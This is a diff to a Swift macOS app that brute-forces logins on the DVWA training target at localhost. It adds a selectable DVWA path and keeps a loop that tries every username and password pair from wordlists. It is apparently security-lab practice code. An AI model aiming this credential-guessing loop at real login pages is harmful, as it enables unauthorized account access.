@@ -14,6 +14,7 @@ class ViewController: NSViewController {
     @IBOutlet weak var passwordsPath: NSTextField!
     @IBOutlet weak var phpSessionID: NSTextField!
     @IBOutlet weak var onlyTrueChecked: NSButton!
+    @IBOutlet weak var dvwaVersion: NSComboBox!
     
     @IBAction func startBruteForce(_ sender: NSButton) {
         guard FileManager.default.fileExists(atPath: userNamesPath.stringValue),
@@ -34,7 +35,7 @@ class ViewController: NSViewController {
             return
         }
         
-        guard let url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=&password=&Login=Login") else { return }
+        guard let url = URL(string: "http://localhost/\(dvwaVersion.stringValue)/vulnerabilities/brute/?username=&password=&Login=Login") else { return }
         
         var request = URLRequest(url: url)
         request.httpMethod = "GET"
@@ -45,7 +46,7 @@ class ViewController: NSViewController {
         
         for user in userNames.split(separator: "\n") {
             for password in passwords.split(separator: "\n") {
-                request.url = URL(string: "http://localhost/dvwa/vulnerabilities/brute/?username=\(user)&password=\(password)&Login=Login")
+                request.url = URL(string: "http://localhost/\(dvwaVersion.stringValue)/vulnerabilities/brute/?username=\(user)&password=\(password)&Login=Login")
                 
                 session.dataTask(with: request) { data, response, error in
                     guard let data = data, let html = String(data: data, encoding: .utf8) else { return }
